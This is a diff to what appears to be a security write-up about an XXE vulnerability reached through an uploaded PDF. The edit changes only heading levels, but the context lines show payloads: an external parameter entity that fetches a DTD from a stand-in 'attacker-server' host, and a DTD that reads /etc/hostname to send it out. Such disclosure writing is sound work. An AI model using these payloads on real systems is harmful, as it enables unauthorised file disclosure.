@@ -73,7 +73,7 @@ Due to the nature of the feature, no direct feedback was available after every u
 
 I had to try different variations of External Parameter entities (an entity referenced inside the DTD). After some trial and error I came up with two working payloads:
 
-### 1st. payload:
+#### 1st. payload:
 
 ```xml
 <!DOCTYPE root [ <!ENTITY % ext SYSTEM "https://attacker-server/poc.dtd">
@@ -93,7 +93,9 @@ The first payload is what I inserted in the PDF file:
 
 At this point, the vulnerable server makes an outbound HTTP request to the attacker's server to download poc.dtd. 
 
-The <b>poc.dtd</b> file (2nd. payload), hosted on the attacker's server, contains the actual exfiltration code:
+#### 2nd. payload:
+
+The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual exfiltration code:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
